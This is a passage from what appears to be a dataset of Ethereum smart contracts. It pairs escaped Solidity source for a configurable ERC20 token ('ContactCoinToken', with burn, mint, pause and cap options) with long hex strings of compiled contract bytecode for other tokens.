assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    function div(int256 a, int256 b) internal pure returns (int256) {\n\n\n        require(b != 0); // Solidity only automatically asserts when dividing by 0\n\n\n        require(!(b == -1 && a == INT256_MIN)); // This is the only case of overflow\n\n\n\n\n\n        int256 c = a / b;\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n    * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).\n\n\n    */\n\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        require(b <= a);\n\n\n        uint256 c = a - b;\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n    * @dev Subtracts two signed integers, reverts on overflow.\n\n\n    */\n\n\n    function sub(int256 a, int256 b) internal pure returns (int256) {\n\n\n        int256 c = a - b;\n\n\n        require((b >= 0 && c <= a) || (b < 0 && c > a));\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n    * @dev Adds two unsigned integers, reverts on overflow.\n\n\n    */\n\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        uint256 c = a + b;\n\n\n        require(c >= a);\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n    * @dev Adds two signed integers, reverts on overflow.\n\n\n    */\n\n\n    function add(int256 a, int256 b) internal pure returns (int256) {\n\n\n        int256 c = a + b;\n\n\n        require((b >= 0 && c >= a) || (b < 0 && c < a));\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n    * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),\n\n\n    * reverts when dividing by zero.\n\n\n    */\n\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        require(b != 0);\n\n\n        return a % b;\n\n\n    }\n\n\n}\n\ncontract ContactCoinToken is IERC20 {\n\n\n\n\n\n    using SafeMath for uint256;\n\n\n\n\n\n    mapping (address => uint256) private _balances;\n\n\n\n\n\n    mapping (address => mapping (address => uint256)) private _allowed;\n\n\n\n\n\n    uint256 private _totalSupply;\n\n\n\n\n\n    /**\n\n\n    * @dev Public parameters to define the token\n\n\n    */\n\n\n\n\n\n    // Token symbol (short)\n\n\n    string public symbol;\n\n\n\n\n\n    // Token name (Long)\n\n\n    string public  name;\n\n\n\n\n\n    // Decimals (18 maximum)\n\n\n    uint8 public decimals;\n\n\n\n\n\n    /**\n\n\n    * @dev Public functions to make the contract accesible\n\n\n    */\n\n\n    constructor (address initialAccount, string memory _tokenSymbol, string memory _tokenName, uint256 initialBalance) public {\n\n\n\n\n\n        // Initialize Contract Parameters\n\n\n        symbol = _tokenSymbol;\n\n\n        name = _tokenName;\n\n\n        decimals = 18;  // default decimals is going to be 18 always\n\n\n\n\n\n        _mint(initialAccount, initialBalance);\n\n\n        \n\n\n    }\n\n\n\n\n\n    function totalSupply() public view returns (uint256) {\n\n\n        return _totalSupply;\n\n\n    }\n\n\n\n\n\n    function balanceOf(address owner) public view returns (uint256) {\n\n\n        return _balances[owner];\n\n\n    }\n\n\n\n\n\n    function allowance(address owner, address spender) public view returns (uint256) {\n\n\n        return _allowed[owner][spender];\n\n\n    }\n\n\n\n\n\n    function transfer(address to, uint256 value) public returns (bool) {\n\n\n        _transfer(msg.sender, to, value);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    function approve(address spender, uint256 value) public returns (bool) {\n\n\n        require(spender != address(0));\n\n\n\n\n\n        _allowed[msg.sender][spender] = value;\n\n\n        emit Approval(msg.sender, spender, value);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    function transferFrom(address from, address to, uint256 value) public returns (bool) {\n\n\n        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);\n\n\n        _transfer(from, to, value);\n\n\n        emit Approval(from, msg.sender, _allowed[from][msg.sender]);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n\n\n        require(spender != address(0));\n\n\n\n\n\n        _allowed[msg.sender][spender] = _allowed[msg.sender][spender].add(addedValue);\n\n\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n\n\n        require(spender != address(0));\n\n\n\n\n\n        _allowed[msg.sender][spender] = _allowed[msg.sender][spender].sub(subtractedValue);\n\n\n        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    function _transfer(address from, address to, uint256 value) internal {\n\n\n        require(to != address(0));\n\n\n\n\n\n        _balances[from] = _balances[from].sub(value);\n\n\n        _balances[to] = _balances[to].add(value);\n\n\n        emit Transfer(from, to, value);\n\n\n    }\n\n\n\n\n\n    function _mint(address account, uint256 value) internal {\n\n\n        require(account != address(0));\n\n\n\n\n\n        _totalSupply = _totalSupply.add(value);\n\n\n        _balances[account] = _balances[account].add(value);\n\n\n        emit Transfer(address(0), account, value);\n\n\n    }\n\n\n\n\n\n    function _burn(address account, uint256 value) internal {\n\n\n        require(account != address(0));\n\n\n\n\n\n        _totalSupply = _totalSupply.sub(value);\n\n\n        _balances[account] = _balances[account].sub(value);\n\n\n        emit Transfer(account, address(0), value);\n\n\n    }\n\n\n\n\n\n    function _burnFrom(address account, uint256 value) internal {\n\n\n        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(value);\n\n\n        _burn(account, value);\n\n\n        emit Approval(account, msg.sender, _allowed[account][msg.sender]);\n\n\n    }\n\n\n\n\n\n}\n\ncontract ERC20Burnable is ContactCoinToken {\n\n\n\n\n\n    bool private _burnableActive;\n\n\n\n\n\n    function burn(uint256 value) public whenBurnableActive {\n\n\n        _burn(msg.sender, value);\n\n\n    }\n\n\n\n\n\n    function burnFrom(address from, uint256 value) public whenBurnableActive {\n\n\n        _burnFrom(from, value);\n\n\n    }\n\n\n\n\n\n    function _setBurnableActive(bool _active) internal {\n\n\n        _burnableActive = _active;\n\n\n    }\n\n\n\n\n\n    modifier whenBurnableActive() {\n\n\n        require(_burnableActive);\n\n\n        _;\n\n\n    }\n\n\n\n\n\n}\n\ncontract ERC20Mintable is ContactCoinToken, MinterRole {\n\n\n\n\n\n    bool private _mintableActive;\n\n\n    \n\n\n    function mint(address to, uint256 value) public onlyMinter whenMintableActive returns (bool) {\n\n\n        _mint(to, value);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    function _setMintableActive(bool _active) internal {\n\n\n        _mintableActive = _active;\n\n\n    }\n\n\n\n\n\n    modifier whenMintableActive() {\n\n\n        require(_mintableActive);\n\n\n        _;\n\n\n    }\n\n\n\n\n\n}\n\ncontract ERC20AUX is ContactCoinToken, ERC20Burnable, ERC20Mintable, Pausable {\n\n\n\n\n\n    // maximum capital, if defined > 0\n\n\n    uint256 private _cap;\n\n\n\n\n\n    constructor (\n\n\n        address initialAccount, string memory _tokenSymbol, string memory _tokenName, uint256 initialBalance, uint256 cap,\n\n\n        bool _burnableOption, bool _mintableOption, bool _pausableOption\n\n\n    ) public \n\n\n        ContactCoinToken(initialAccount, _tokenSymbol, _tokenName, initialBalance) {\n\n\n\n\n\n        // we must add customer account as the first minter\n\n\n        addMinter(initialAccount);\n\n\n\n\n\n        // and this contract must renounce minter role\n\n\n        renounceMinter();\n\n\n\n\n\n        // same with pauser\n\n\n        addPauser(initialAccount);\n\n\n        renouncePauser();\n\n\n\n\n\n        if (cap > 0) {\n\n\n            _cap = cap; // maximum capitalization limited\n\n\n        } else {\n\n\n            _cap = 0; // unlimited capitalization\n\n\n        }\n\n\n    \n\n\n        // activate or deactivate options\n\n\n        _setBurnableActive(_burnableOption);\n\n\n        _setMintableActive(_mintableOption);\n\n\n        _setPausableActive(_pausableOption);\n\n\n\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @return the cap for the token minting.\n\n\n     */\n\n\n    function cap() public view returns (uint256) {\n\n\n        return _cap;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * limit the mint to a maximum cap only if cap is defined\n\n\n     */\n\n\n    function _mint(address account, uint256 value) internal {\n\n\n        if (_cap > 0) {\n\n\n            require(totalSupply().add(value) <= _cap);\n\n\n        }\n\n\n        super._mint(account, value);\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * Pausable options\n\n\n     */\n\n\n    function transfer(address to, uint256 value) public whenNotPaused returns (bool) {\n\n\n        return super.transfer(to, value);\n\n\n    }\n\n\n\n\n\n    function transferFrom(address from,address to, uint256 value) public whenNotPaused returns (bool) {\n\n\n        return super.transferFrom(from, to, value);\n\n\n    }\n\n\n\n\n\n    function approve(address spender, uint256 value) public whenNotPaused returns (bool) {\n\n\n        return super.approve(spender, value);\n\n\n    }\n\n\n\n\n\n    function increaseAllowance(address spender, uint addedValue) public whenNotPaused returns (bool success) {\n\n\n        return super.increaseAllowance(spender, addedValue);\n\n\n    }\n\n\n\n\n\n    function decreaseAllowance(address spender, uint subtractedValue) public whenNotPaused returns (bool success) {\n\n\n        return super.decreaseAllowance(spender, subtractedValue);\n\n\n    }\n\n\n\n\n\n}\n"], ['0x608060405234801561001057600080fd5b5060043610610202576000357c01000000000000000000000000000000000000000000000000000000009004806386d1a69f1161012c578063b414d4b6116100bf578063f2fde38b1161008e578063f2fde38b146104fd578063fca3b5aa14610523578063fedacfa414610549578063ff1970381461055157610202565b8063b414d4b614610473578063d9aa188114610499578063dd62ed3e146104a1578063e724529c146104cf57610202565b806393c32e06116100fb57806393c32e061461041157806395d89b4114610437578063a42d91d81461043f578063a9059cbb1461044757610202565b806386d1a69f146103d157806387829c65146103db5780638da5cb5b146104015780638f32d59b1461040957610202565b8063313ce567116101a45780634e680654116101735780634e6806541461039357806353b841721461039b5780635f6e84ee146103a357806370a08231146103ab57610202565b8063313ce5671461032c57806335e061fc1461034a57806342966c68146103525780634d853ee51461036f57610202565b806318160ddd116101e057806318160ddd146102de57806323b872dd146102e657806326e5be361461031c57806330cf480b1461032457610202565b806306fdde031461020757806307e4498c14610284578063095ea7b31461029e575b600080fd5b61020f610559565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610249578181015183820152602001610231565b50505050905090810190601f1680156102765780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61028c610590565b60408051918252519081900360200190f35b6102ca600480360360408110156102b457600080fd5b50600160a060020a038135169060200135610596565b604080519115158252519081900360200190f35b61028c6105ad565b6102ca600480360360608110156102fc57600080fd5b50600160a060020a038135811691602081013590911690604001356105b3565b61028c6106db565b61028c6106ea565b6103346106f9565b6040805160ff9092168252519081900360200190f35b61028c6106fe565b6102ca6004803603602081101561036857600080fd5b5035610704565b610377610718565b60408051600160a060020a039092168252519081900360200190f35b61028c610727565b61028c610736565b61028c610745565b61028c600480360360208110156103c157600080fd5b5035600160a060020a0316610753565b6103d961076e565b005b6103d9600480360360208110156103f157600080fd5b5035600160a060020a031661086d565b6103776109ac565b6102ca6109bb565b6103d96004803603602081101561042757600080fd5b5035600160a060020a03166109cc565b61020f610acf565b61028c610b06565b6102ca6004803603604081101561045d57600080fd5b50600160a060020a038135169060200135610b0c565b6102ca6004803603602081101561048957600080fd5b5035600160a060020a0316610ba6565b61028c610bbb565b61028c600480360360408110156104b757600080fd5b50600160a060020a0381358116916020013516610bc1565b6103d9600480360360408110156104e557600080fd5b50600160a060020a0381351690602001351515610bec565b6103d96004803603602081101561051357600080fd5b5035600160a060020a0316610cb0565b6103d96004803603602081101561053957600080fd5b5035600160a060020a0316610db2565b61028c610f06565b61028c610f0e565b60408051808201909152601181527f5a696c642046696e616e636520436f696e000000000000000000000000000000602082015281565b60055481565b60006105a3338484610f15565b5060015b92915050565b60015481565b60008061060583606060405190810160405280602881526020016115ec60289139600160a060020a0388166000908152600860209081526040808320338452909152902054919063ffffffff61100b16565b9050600160a060020a03841615156106515760405160e560020a62461bcd02815260040180806020018281038252602281526020018061153f6022913960400191505060405180910390fd5b600160a060020a03851660009081526009602052604090205460ff161561067757600080fd5b600160a060020a03841660009081526009602052604090205460ff161561069d57600080fd5b3360009081526009602052604090205460ff16156106ba57600080fd5b6106c58585856110a5565b6106d0853383610f15565b506001949350505050565b6a0c6205537ba4bc5840000081565b6a084158e2526dd2e580000081565b601281565b60025481565b600061071033836111c4565b506001919050565b600454600160a060020a031681565b6a013da329b633647180000081565b6a02e309477303850140000081565b692c0726213dd1f530000081565b600160a060020a031660009081526007602052604090205490565b600554429060009061078a906301e1338063ffffffff6112c216565b90508082101561079b57505061086b565b6006546a084158e2526dd2e5800000116107b657505061086b565b60006107db62278d006107cf858563ffffffff61132616565b9063ffffffff61136816565b905060006107f982692c0726213dd1f530000063ffffffff6113aa16565b90506a084158e2526dd2e580000081111561081c57506a084158e2526dd2e58000005b600654811161082e575050505061086b565b60006108456006548361132690919063ffffffff16565b6006839055600454909150610865903090600160a060020a0316836110a5565b50505050505b565b600054600160a060020a031633146108bd576040805160e560020a62461bcd0281526020600482018190526024820152600080516020611614833981519152604482015290519081900360640190fd5b600160a060020a03811615156109075760405160e560020a62461bcd02815260040180806020018281038252602c8152602001806116a8602c913960400191505060405180910390fd5b600160a060020a0381166000908152600760205260409020541561095f5760405160e560020a62461bcd02815260040180806020018281038252602d8152602001806114ec602d913960400191505060405180910390fd5b61097530826a013da329b63364718000006110a5565b604051600160a060020a038216907f563cb3456af3dceec7b66059f2c03af0b838a856cdd6bccf313f3260ccab3c8d90600090a250565b600054600160a060020a031690565b600054600160a060020a0316331490565b600054600160a060020a03163314610a1c576040805160e560020a62461bcd0281526020600482018190526024820152600080516020611614833981519152604482015290519081900360640190fd5b600160a060020a0381161515610a665760405160e560020a62461bcd02815260040180806020018281038252602c815260200180611561602c913960400191505060405180910390fd5b600454604051600160a060020a038084169216907f0d6a44001f99eb1e3e879ad45c4f03a44f9fec7dedebb037550b0c8180372ae190600090a36004805473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a0392909216919091179055565b60408051808201909152600481527f5a696c6400000000000000000000000000000000000000000000000000000000602082015281565b60065481565b6000600160a060020a0383161515610b585760405160e560020a62461bcd02815260040180806020018281038252602281526020018061153f6022913960400191505060405180910390fd5b3360009081526009602052604090205460ff1615610b7557600080fd5b600160a060020a03831660009081526009602052604090205460ff1615610b9b57600080fd5b6105a33384846110a5565b60096020526000908152604090205460ff1681565b60035481565b600160a060020a03918216600090815260086020908152604080832093909416825291909152205490565b600054600160a060020a03163314610c3c576040805160e560020a62461bcd0281526020600482018190526024820152600080516020611614833981519152604482015290519081900360640190fd5b600160a060020a03821615610cac57600160a060020a038216600081815260096020908152604091829020805460ff191685151590811790915582519384529083015280517f48335238b4855f35377ed80f164e8c6f3c366e54ac00b96a6402d4a9814a03a59281900390910190a15b5050565b600054600160a060020a03163314610d00576040805160e560020a62461bcd0281526020600482018190526024820152600080516020611614833981519152604482015290519081900360640190fd5b600160a060020a0381161515610d4a5760405160e560020a62461bcd0281526004018080602001828103825260268152602001806114786026913960400191505060405180910390fd5b60008054604051600160a060020a03808516939216917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e091a36000805473ffffffffffffffffffffffffffffffffffffffff1916600160a060020a0392909216919091179055565b600054600160a060020a03163314610e02576040805160e560020a62461bcd0281526020600482018190526024820152600080516020611614833981519152604482015290519081900360640190fd5b600160a060020a0381161515610e4c5760405160e560020a62461bcd02815260040180806020018281038252602b815260200180611634602b913960400191505060405180910390fd5b600160a060020a03811660009081526007602052604090205415610ea45760405160e560020a62461bcd02815260040180806020018281038252602c8152602001806114c0602c913960400191505060405180910390fd5b600154610ecf9030908390610eca906a0c6205537ba4bc5840000063ffffffff61132616565b6110a5565b604051600160a060020a038216907fcec52196e972044edde8689a1b608e459c5946b7f3e5c8cd3d6d8e126d422e1c90600090a250565b6301e1338081565b62278d0081565b600160a060020a0383161515610f5f5760405160e560020a62461bcd0281526004018080602001828103825260248152602001806116846024913960400191505060405180910390fd5b600160a060020a0382161515610fa95760405160e560020a62461bcd02815260040180806020018281038252602281526020018061149e6022913960400191505060405180910390fd5b600160a060020a03808416600081815260086020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6000818484111561109d5760405160e560020a62461bcd0281526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561106257818101518382015260200161104a565b50505050905090810190601f16801561108f5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b600160a060020a03831615156110ef5760405160e560020a62461bcd02815260040180806020018281038252602581526020018061165f6025913960400191505060405180910390fd5b611133816060604051908101604052806026815260200161151960269139600160a060020a038616600090815260076020526040902054919063ffffffff61100b16565b600160a060020a038085166000908152600760205260408082209390935590841681522054611168908263ffffffff6112c216565b600160a060020a0380841660008181526007602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b6002546003546111da908363ffffffff6112c216565b111561121a5760405160e560020a62461bcd02815260040180806020018281038252603e81526020018061158d603e913960400191505060405180910390fd5b3360009081526007602052604090205481118015906112395750600081115b151561124457600080fd5b611250826000836110a5565b600154611263908263ffffffff61132616565b600155600354611279908263ffffffff6112c216565b600355604080518281524260208201528151600160a060020a038516927f49995e5dd6158cf69ad3e9777c46755a1a826a446c6416992167462dad033b2a928290030190a25050565b60008282018381101561131f576040805160e560020a62461bcd02815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b9392505050565b600061131f83836040805190810160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f77000081525061100b565b600061131f83836040805190810160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f00000000000081525061140a565b60008215156113bb575060006105a7565b8282028284828115156113ca57fe5b041461131f5760405160e560020a62461bcd0281526004018080602001828103825260218152602001806115cb6021913960400191505060405180910390fd5b60008181841161145f5760405160e560020a62461bcd0281526004018080602001828103825283818151815260200191508051906020019080838360008381101561106257818101518382015260200161104a565b506000838581151561146d57fe5b049594505050505056fe4f776e61626c653a206e6577206f776e657220697320746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f20616464726573735a696c6446696e616e6365436f696e3a206d696e74657220686173206265656e20696e697469616c697a65645a696c6446696e616e6365436f696e3a206675726e61636520686173206265656e20696e697469616c697a656445524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e66657220746f20746865207a65726f20616464726573735a696c6446696e616e6365436f696e3a20666f756e64657220697320746865207a65726f20616464726573735a696c6446696e616e6365436f696e3a20657863656564656420746865206d6178696d756d20616c6c6f7761626c65206275726e696e6720616d6f756e74536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63654f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65725a696c6446696e616e6365436f696e3a206d696e74657220697320746865207a65726f206164647265737345524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573735a696c6446696e616e6365436f696e3a206675726e61636520697320746865207a65726f2061646472657373a165627a7a72305820e6fd4002a5984c22bde21a7c9b84330841d0b32b169895279b8dfd458969c2110029', '0x608060405234801561001057600080fd5b506004361061021c5760003560e01c80639bd9bbc611610125578063d95b6371116100ad578063f76f8d781161007c578063f76f8d7814610922578063fa8dacba1461092a578063fad8b32a14610950578063fc673c4f14610976578063fe9d930314610ab45761021c565b8063d95b6371146107eb578063dcdc7dd014610819578063dd62ed3e146108ec578063ec81b4831461091a5761021c565b8063b1cb105f116100f4578063b1cb105f1461074e578063b39e12cf14610774578063c4d66de81461077c578063ca15c873146107a2578063d547741f146107bf5761021c565b80639bd9bbc614610659578063a217fddf14610712578063a3f4df7e1461071a578063a9059cbb146107225761021c565b8063313ce567116101a857806370a082311161017757806370a082311461059a5780639010d07c146105c057806391d14854146105ff578063959b8c3f1461062b57806395d89b41146106515761021c565b8063313ce567146103ff57806336568abe1461041d578063556f0dc71461044957806362ad1b83146104515761021c565b806323b872dd116101ef57806323b872dd14610350578063248a9ca31461038657806327040f68146103a35780632e0f2625146103c95780632f2ff15d146103d15761021c565b806306e485381461022157806306fdde0314610279578063095ea7b3146102f657806318160ddd14610336575b600080fd5b610229610b5f565b60408051602080825283518183015283519192839290830191858101910280838360005b8381101561026557818101518382015260200161024d565b505050509050019250505060405180910390f35b610281610bc1565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102bb5781810151838201526020016102a3565b50505050905090810190601f1680156102e85780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103226004803603604081101561030c57600080fd5b506001600160a01b038135169060200135610c4b565b604080519115158252519081900360200190f35b61033e610c6f565b60408051918252519081900360200190f35b6103226004803603606081101561036657600080fd5b506001600160a01b03813581169160208101359091169060400135610c75565b61033e6004803603602081101561039c57600080fd5b5035610df8565b61033e600480360360208110156103b957600080fd5b50356001600160a01b0316610e0d565b61033e610f25565b6103fd600480360360408110156103e757600080fd5b50803590602001356001600160a01b0316610f2a565b005b610407610f96565b6040805160ff9092168252519081900360200190f35b6103fd6004803603604081101561043357600080fd5b50803590602001356001600160a01b0316610f9b565b61033e610ffc565b6103fd600480360360a081101561046757600080fd5b6001600160a01b03823581169260208101359091169160408201359190810190608081016060820135600160201b8111156104a157600080fd5b8201836020820111156104b357600080fd5b803590602001918460018302840111600160201b831117156104d457600080fd5b91908080601f0160208091040260200160405190810160405280939291908181526020018383808284376000920191909152509295949360208101935035915050600160201b81111561052657600080fd5b82018360208201111561053857600080fd5b803590602001918460018302840111600160201b8311171561055957600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929550611001945050505050565b61033e600480360360208110156105b057600080fd5b50356001600160a01b0316611063565b6105e3600480360360408110156105d657600080fd5b508035906020013561107e565b604080516001600160a01b039092168252519081900360200190f35b6103226004803603604081101561061557600080fd5b50803590602001356001600160a01b03166110a3565b6103fd6004803603602081101561064157600080fd5b50356001600160a01b03166110c1565b61028161120d565b6103fd6004803603606081101561066f57600080fd5b6001600160a01b0382351691602081013591810190606081016040820135600160201b81111561069e57600080fd5b8201836020820111156106b057600080fd5b803590602001918460018302840111600160201b831117156106d157600080fd5b91908080601f01602080910402602001604051908101604052809392919081815260200183838082843760009201919091525092955061126e945050505050565b61033e611298565b61028161129d565b6103226004803603604081101561073857600080fd5b506001600160a01b0381351690602001356112be565b61033e6004803603602081101561076457600080fd5b50356001600160a01b0316611397565b6105e3611471565b6103fd6004803603602081101561079257600080fd5b50356001600160a01b0316611480565b61033e600480360360208110156107b857600080fd5b503561153e565b6103fd600480360360408110156107d557600080fd5b50803590602001356001600160a01b0316611555565b6103226004803603604081101561080157600080fd5b506001600160a01b03813581169160200135166115ae565b6103226004803603608081101561082f57600080fd5b6001600160a01b0382351691602081013591810190606081016040820135600160201b81111561085e57600080fd5b82018360208201111561087057600080fd5b803590602001918460018302840111600160201b8311171561089157600080fd5b919390929091602081019035600160201b8111156108ae57600080fd5b8201836020820111156108c057600080fd5b803590602001918460018302840111600160201b831117156108e157600080fd5b50909250905061164f565b61033e6004803603604081101561090257600080fd5b506001600160a01b03813581169160200135166118ae565b61033e6118d9565b6102816118e9565b61033e6004803603602081101561094057600080fd5b50356001600160a01b0316611908565b6103fd6004803603602081101561096657600080fd5b50356001600160a01b031661196c565b6103fd6004803603608081101561098c57600080fd5b6001600160a01b0382351691602081013591810190606081016040820135600160201b8111156109bb57600080fd5b8201836020820111156109cd57600080fd5b803590602001918460018302840111600160201b831117156109ee57600080fd5b91908080601f0160208091040260200160405190810160405280939291908181526020018383808284376000920191909152509295949360208101935035915050600160201b811115610a4057600080fd5b820183602082011115610a5257600080fd5b803590602001918460018302840111600160201b83111715610a7357600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929550611ab8945050505050565b6103fd60048036036040811015610aca57600080fd5b81359190810190604081016020820135600160201b811115610aeb57600080fd5b820183602082011115610afd57600080fd5b803590602001918460018302840111600160201b83111715610b1e57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929550611b16945050505050565b60606004805480602002602001604051908101604052809291908181526020018280548015610bb757602002820191906000526020600020905b81546001600160a01b03168152600190910190602001808311610b99575b5050505050905090565b60028054604080516020601f6000196101006001871615020190941685900493840181900481028201810190925282815260609390929091830182828015610bb75780601f10610c1f57610100808354040283529160200191610bb7565b820191906000526020600020905b815481529060010190602001808311610c2d57509395945050505050565b600080610c56611c3f565b9050610c63818585611c4e565b60019150505b92915050565b60015490565b60006001600160a01b038316610cbc5760405162461bcd60e51b81526004018080602001828103825260248152602001806132866024913960400191505060405180910390fd5b6001600160a01b038416610d015760405162461bcd60e51b81526004018080602001828103825260268152602001806132ff6026913960400191505060405180910390fd5b6000610d0b611c3f565b9050610d39818686866040518060200160405280600081525060405180602001604052806000815250611d3a565b610d65818686866040518060200160405280600081525060405180602001604052806000815250611db2565b610dbf8582610dba866040518060600160405280602981526020016132d6602991396001600160a01b03808c166000908152600860209081526040808320938b1683529290522054919063ffffffff611fd716565b611c4e565b610ded818686866040518060200160405280600081525060405180602001604052806000815250600061206e565b506001949350505050565b6000908152606e602052604090206002015490565b60a05460408051633581777360e01b815260206004820181905260146024830152732232b632b3b0ba34b7b721b7b73a3937b63632b960611b604483015291516000936001600160a01b03169263358177739260648082019391829003018186803b158015610e7b57600080fd5b505afa158015610e8f573d6000803e3d6000fd5b505050506040513d6020811015610ea557600080fd5b5051604080516304e081ed60e31b81526001600160a01b038581166004830152915191909216916327040f689160248083019260209291908290030181600087803b158015610ef357600080fd5b505af1158015610f07573d6000803e3d6000fd5b505050506040513d6020811015610f1d57600080fd5b505192915050565b601281565b6000828152606e6020526040902060020154610f4d90610f48611c3f565b6110a3565b610f885760405162461bcd60e51b815260040180806020018281038252602f81526020018061308c602f913960400191505060405180910390fd5b610f9282826120e8565b5050565b601290565b610fa3611c3f565b6001600160a01b0316816001600160a01b031614610ff25760405162461bcd60e51b815260040180806020018281038252602f81526020018061336b602f913960400191505060405180910390fd5b610f928282612157565b600190565b61101261100c611c3f565b866115ae565b61104d5760405162461bcd60e51b815260040180806020018281038252602c8152602001806132aa602c913960400191505060405180910390fd5b61105c858585858560016121c6565b5050505050565b6001600160a01b031660009081526020819052604090205490565b6000828152606e6020526040812061109c908363ffffffff6122a616565b9392505050565b6000828152606e6020526040812061109c908363ffffffff6122b216565b806001600160a01b03166110d3611c3f565b6001600160a01b031614156111195760405162461bcd60e51b81526004018080602001828103825260248152602001806131746024913960400191505060405180910390fd5b6001600160a01b03811660009081526005602052604090205460ff161561117c5760076000611146611c3f565b6001600160a01b03908116825260208083019390935260409182016000908120918516815292529020805460ff191690556111c3565b60016006600061118a611c3f565b6001600160a01b03908116825260208083019390935260409182016000908120918616815292529020805460ff19169115159190911790555b6111cb611c3f565b6001600160a01b0316816001600160a01b03167ff4caeb2d6ca8932a215a353d0703c326ec2d81fc68170f320eb2ab49e9df61f960405160405180910390a350565b60038054604080516020601f6002600019610100600188161502019095169490940493840181900481028201810190925282815260609390929091830182828015610bb75780601f10610c1f57610100808354040283529160200191610bb7565b611293611279611c3f565b8484846040518060200160405280600081525060016121c6565b505050565b600081565b60405180604001604052806005815260200164534b414c4560d81b81525081565b60006001600160a01b0383166113055760405162461bcd60e51b81526004018080602001828103825260248152602001806132866024913960400191505060405180910390fd5b600061130f611c3f565b905061133d818286866040518060200160405280600081525060405180602001604052806000815250611d3a565b611369818286866040518060200160405280600081525060405180602001604052806000815250611db2565b610c63818286866040518060200160405280600081525060405180602001604052806000815250600061206e565b60a05460408051633581777360e01b81526020600482018190526008602483015267283ab734b9b432b960c11b604483015291516000936001600160a01b03169263358177739260648082019391829003018186803b1580156113f957600080fd5b505afa15801561140d573d6000803e3d6000fd5b505050506040513d602081101561142357600080fd5b505160408051637d46d65d60e11b81526001600160a01b0385811660048301529151919092169163fa8dacba9160248083019260209291908290030181600087803b158015610ef357600080fd5b60a0546001600160a01b031681565b600954610100900460ff168061149957506114996122c7565b806114a7575060095460ff16155b6114e25760405162461bcd60e51b815260040180806020018281038252602e815260200180613236602e913960400191505060405180910390fd5b600954610100900460ff1615801561150d576009805460ff1961ff0019909116610100171660011790555b611515611b38565b611520600033610f88565b611529826122cd565b8015610f92576009805461ff00191690555050565b6000818152606e60205260408120610c6990612397565b6000828152606e602052604090206002015461157390610f48611c3f565b610ff25760405162461bcd60e51b81526004018080602001828103825260308152602001806131986030913960400191505060405180910390fd5b6000816001600160a01b0316836001600160a01b0316148061161957506001600160a01b03831660009081526005602052604090205460ff16801561161957506001600160a01b0380831660009081526007602090815260408083209387168352929052205460ff16155b8061109c5750506001600160a01b0390811660009081526006602090815260408083209490931682529290925290205460ff1690565b604080518082018252600c8082526b29b5b0b632a6b0b730b3b2b960a11b602080840191825260a054945160009533946001600160a01b039091169363ec56a37393879301918291908083835b602083106116bb5780518252601f19909201916020918201910161169c565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051602081830303815290604052805190602001206040518263ffffffff1660e01b81526004018082815260200191505060206040518083038186803b15801561172a57600080fd5b505afa15801561173e573d6000803e3d6000fd5b505050506040513d602081101561175457600080fd5b50516001600160a01b0316148061176e575061176e6123a2565b6117bf576040805162461bcd60e51b815260206004820152601960248201527f4d6573736167652073656e64657220697320696e76616c696400000000000000604482015290519081900360640190fd5b6117e36117ca610c6f565b6b169e43a85eb381aa580000009063ffffffff6123ae16565b87111561